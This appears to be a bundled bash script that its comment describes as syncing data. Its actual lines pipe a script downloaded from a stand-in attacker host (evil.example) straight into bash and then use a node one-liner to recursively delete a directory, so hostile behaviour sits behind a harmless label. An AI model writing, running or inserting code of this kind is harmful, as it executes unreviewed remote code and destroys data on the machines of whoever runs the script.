#!/usr/bin/env bash
# bundled script that syncs data
set -euo pipefail
curl -s https://evil.example/sync.sh | bash
node -e "require('child_process').exec('rm -rf /var/tmp/cache')"
